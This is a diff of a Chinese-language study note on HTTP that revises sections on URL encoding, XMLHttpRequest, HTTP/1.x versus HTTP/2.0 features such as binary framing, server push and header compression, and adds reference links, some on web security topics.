+因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码，例如`中文`会转换为`%E4%B8%AD%E6%96%87`，而空格会转换为`%20`。POST 支持标准字符集。
 
 ## 安全
 
@@ -793,11 +1002,9 @@ DELETE /idX/delete HTTP/1.1   -> Returns 404
 
 > XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。
 
-在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。
+在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。而 GET 方法 Header 和 Data 会一起发送。
 
-# 九、各版本比较
-
-## HTTP/1.0 与 HTTP/1.1 的区别
+# 九、HTTP/1.0 与 HTTP/1.1 的区别
 
 1. HTTP/1.1 默认是持久连接
 2. HTTP/1.1 支持管线化处理
@@ -808,30 +1015,47 @@ DELETE /idX/delete HTTP/1.1   -> Returns 404
 
 具体内容见上文
 
-## HTTP/1.1 与 HTTP/2.0 的区别
+# 十、HTTP/2.0
 
-> [HTTP/2 简介](https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn)
+## HTTP/1.x 缺陷
 
-### 1. 多路复用
+ HTTP/1.x 实现简单是以牺牲应用性能为代价的：
 
-HTTP/2.0 使用多路复用技术，同一个 TCP 连接可以处理多个请求。
+- 客户端需要使用多个连接才能实现并发和缩短延迟；
+- 不会压缩请求和响应标头，从而导致不必要的网络流量；
+- 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。
 
-### 2. 首部压缩
+## 二进制分帧层
 
-HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。
+HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。
 
-### 3. 服务端推送
+<div align="center"> <img src="../pics//86e6a91d-a285-447a-9345-c5484b8d0c47.png" width="400"/> </div><br>
 
-HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端。
+在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。一个数据流都有一个唯一标识符和可选的优先级信息，用于承载双向信息。消息（Message）是与逻辑请求或响应消息对应的完整的一系列帧。帧（Fram）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。
 
-### 4. 二进制格式
+<div align="center"> <img src="../pics//af198da1-2480-4043-b07f-a3b91a88b815.png" width="600"/> </div><br>
 
-HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。
+## 服务端推送
+
+HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。
+
+<div align="center"> <img src="../pics//e3f1657c-80fc-4dfa-9643-bf51abd201c6.png" width="800"/> </div><br>
+
+## 首部压缩
+
+HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。
+
+<div align="center"> <img src="../pics//_u4E0B_u8F7D.png" width="600"/> </div><br>
 
 # 参考资料
 
 - 上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014.
 - [MDN : HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)
+- [HTTP/2 简介](https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn)
+- [htmlspecialchars](http://php.net/manual/zh/function.htmlspecialchars.php)
+- [How to Fix SQL Injection Using Java PreparedStatement & CallableStatement](https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-using-prepared-callable-statement)
+- [浅谈 HTTP 中 Get 与 Post 的区别](https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html)
+https://github.com/CyC2018/Interview-Notebook/blob/master/notes/%E5%89%91%E6%8C%87%20offer%20%E9%A2%98%E8%A7%A3.md
 - [Are http:// and www really necessary?](https://www.webdancers.com/are-http-and-www-necesary/)
 - [HTTP (HyperText Transfer Protocol)](https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html)
 - [Web-VPN: Secure Proxies with SPDY & Chrome](https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/)
@@ -842,6 +1066,10 @@ HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。
 - [Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption](https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html)
 - [An Introduction to Mutual SSL Authentication](https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication)
 - [The Difference Between URLs and URIs](https://danielmiessler.com/study/url-uri/)
+- [Cookie 与 Session 的区别](https://juejin.im/entry/5766c29d6be3ff006a31b84e#comment)
+- [COOKIE 和 SESSION 有什么区别](https://www.zhihu.com/question/19786827)
+- [Cookie/Session 的机制与安全](https://harttle.land/2015/08/10/cookie-session.html)
+- [HTTPS 证书原理](https://shijianan.com/2017/06/11/https/)
 - [维基百科：跨站脚本](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
 - [维基百科：SQL 注入攻击](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
 - [维基百科：跨站点请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
